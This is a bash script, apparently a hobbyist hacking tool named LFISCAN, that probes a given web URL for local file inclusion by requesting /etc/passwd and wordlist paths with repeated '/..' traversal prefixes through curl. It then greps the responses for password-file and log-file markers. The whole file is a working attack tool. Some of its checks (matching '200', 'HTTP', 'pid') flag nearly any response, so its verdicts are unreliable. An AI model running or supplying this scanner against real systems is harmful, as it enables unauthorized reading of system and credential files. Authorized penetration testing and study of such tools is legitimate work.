#!/bin/bash

################################
# Local File Inclusion Scanner #
# by 0bfxgh0st*                #
################################

lfiscan_temp_folder="/tmp/tmp_lfiscan/"
mkdir "$lfiscan_temp_folder" 2>/dev/null
rm -r /tmp/tmp_lfiscan/* 2>/dev/null
### output filename based on date ###
systime=$(date +"%m_%d_%Y_%T")
output_file="$systime.LFISCAN"
####################################
## iterations iterations in loop, possible_lfi_file var, path_traversal string ../ ###
iterations=5
possible_lfi_file="/etc/passwd"
path_traversal="/.."
################################################################

function _help_(){
	printf "%s\n\n" "LFISCAN v0.1"
	printf "%s\n\n" "Usage bash lfiscan.sh <url>"
	printf "%s\n" "Options:"
	printf "%s\n" "-h        --help               Help"
	printf "%s\n\n" "-w        --wordlist           Specify directory wordlist"
	printf "%s\n\n" "Scan results will be stored automatically in $lfiscan_temp_folder folder"
	printf "%s\n" "Example bash lfiscan.sh http://ghost.server/index.php?page= -d wordlist.txt"
	exit
}

function _LFI_CHECK_DEFAULT_(){

	if [[ $(grep 'bin' /tmp/tmp_lfiscan/*.LFISCAN) == *":0:0:"* ]] || [[ $(grep 'HW type' /tmp/tmp_lfiscan/*.LFISCAN) == *"HW type"* ]];
        then
        	printf "[\e[0;32m+\e[0m] \e[1m[LFI VULNERABLE] \e[0m$1$possible_lfi_file\n"
	fi

	if [[ $(grep 'This product contains software licensed under terms which require Microsoft to display the following' /tmp/tmp_lfiscan/*.LFISCAN) == *"This product contains software licensed under terms which require Microsoft to display the following"* ]] || [[ $(grep '200' /tmp/tmp_lfiscan/*.LFISCAN) == *"200"* ]] || [[ $(grep 'HTTP' /tmp/tmp_lfiscan/*.LFISCAN) == *"HTTP"* ]] || [[ $(grep ':tid' /tmp/tmp_lfiscan/*.LFISCAN) == *":tid"* ]] || [[ $(grep 'pid' /tmp/tmp_lfiscan/*.LFISCAN) == *"pid"* ]] || [[ $(grep 'PHP Warning:' /tmp/tmp_lfiscan/*.LFISCAN) == *"PHP Warning:"* ]] || [[ $(grep 'ssl:warn' /tmp/tmp_lfiscan/*.LFISCAN) == *"ssl:warn"* ]] || [[ $(grep 'core:notice' /tmp/tmp_lfiscan/*.LFISCAN) == *"core:notice"* ]] || [[ $(grep 'child process' /tmp/tmp_lfiscan/*.LFISCAN) == *"child process"* ]] || [[ $(grep 'worker threads' /tmp/tmp_lfiscan/*.LFISCAN) == *"worker threads"* ]]
        then
                printf "[\e[0;32m+\e[0m] \e[1m[LFI VULNERABLE] \e[0m$1$possible_lfi_file\n"
        fi

}


function _LFI_CHECK_WORDLIST_(){

	if [[ $(grep 'bin' /tmp/tmp_lfiscan/*.LFISCAN) == *":0:0:"* ]] || [[ $(grep 'HW type' /tmp/tmp_lfiscan/*.LFISCAN) == *"HW type"* ]];
	then
		printf "[\e[0;32m+\e[0m] \e[1m[LFI VULNERABLE] \e[0m$1$j\n"
        fi

	if [[ $(grep 'This product contains software licensed under terms which require Microsoft to display the following' /tmp/tmp_lfiscan/*.LFISCAN) == *"This product contains software licensed under terms which require Microsoft to display the following"* ]] || [[ $(grep '200' /tmp/tmp_lfiscan/*.LFISCAN) == *"200"* ]] || [[ $(grep 'HTTP' /tmp/tmp_lfiscan/*.LFISCAN) == *"HTTP"* ]] || [[ $(grep ':tid' /tmp/tmp_lfiscan/*.LFISCAN) == *":tid"* ]] || [[ $(grep 'pid' /tmp/tmp_lfiscan/*.LFISCAN) == *"pid"* ]] || [[ $(grep 'PHP Warning:' /tmp/tmp_lfiscan/*.LFISCAN) == *"PHP Warning:"* ]] || [[ $(grep 'ssl:warn' /tmp/tmp_lfiscan/*.LFISCAN) == *"ssl:warn"* ]] || [[ $(grep 'core:notice' /tmp/tmp_lfiscan/*.LFISCAN) == *"core:notice"* ]] || [[ $(grep 'child process' /tmp/tmp_lfiscan/*.LFISCAN) == *"child process"* ]] || [[ $(grep 'worker threads' /tmp/tmp_lfiscan/*.LFISCAN) == *"worker threads"* ]]
        then
                printf "[\e[0;32m+\e[0m] \e[1m[LFI VULNERABLE] \e[0m$1$j\n"
        fi

}

################### external args help ########################
for args in "$@"
do
	if [ "$args" == "-h" ] || [ "$args" == "--help" ];
	then
		_help_
		exit
	fi
done
###############################################################


if [[ -z "$1" ]];
then
	_help_
	exit
fi


########################################################################################################## MAIN
if [[ -z "$2" ]];
then
	printf "[ \e[1mURL\e[0m ] $1\n"
	printf "%s\n" "Default directory is set to $possible_lfi_file"

	printf "\n\e[1;31m[ URL ] -->\e[0m \e[1m$1$possible_lfi_file\e[0m\n" >> "$lfiscan_temp_folder$output_file"
        curl -s "$1$possible_lfi_file" >> "$lfiscan_temp_folder$output_file"
	_LFI_CHECK_DEFAULT_ "$1"

	for ((h = 0; h < iterations; h++));do
		possible_lfi_file="$path_traversal$possible_lfi_file"
        	printf "\n\e[1;31m[ URL ] -->\e[0m \e[1m$1$possible_lfi_file\e[0m\n" >> "$lfiscan_temp_folder$output_file"
        	curl -s "$1$possible_lfi_file" >> "$lfiscan_temp_folder$output_file"

		_LFI_CHECK_DEFAULT_ "$1"
	done

#	cat "$lfiscan_temp_folder/$output_file"

fi

###########################################################################################################


############################################################################################################# WORDLIST

if [ "$2" == "-w" ] || [ "$2" == "--wordlist" ]  || [ "$4" == "-w" ] || [ "$4" == "--wordlist" ];
then
	if [[ -z "$3" ]];
	then
		_help_
		exit
	fi

	printf "[ \e[1mURL\e[0m ] $1\n"
	wordlist_read=$(cat "$3")
	for j in $wordlist_read;
	do
		printf "\n\e[1;31m[ URL ] -->\e[0m \e[1m$1$j\e[0m\n" >> "$lfiscan_temp_folder$output_file"
		curl -s "$1$j" >> "$lfiscan_temp_folder$output_file"

		_LFI_CHECK_WORDLIST_ "$1"

		for ((m = 0; m < iterations; m++));
        	do
			j="$path_traversal$j"
        		printf "\n\e[1;31m[ URL ] -->\e[0m \e[1m$1$j\e[0m\n" >> "$lfiscan_temp_folder$output_file"
        		curl -s "$1$j" >> "$lfiscan_temp_folder$output_file"

			_LFI_CHECK_WORDLIST_ "$1"

		done

	done

#	cat "$lfiscan_temp_folder/$output_file"


fi

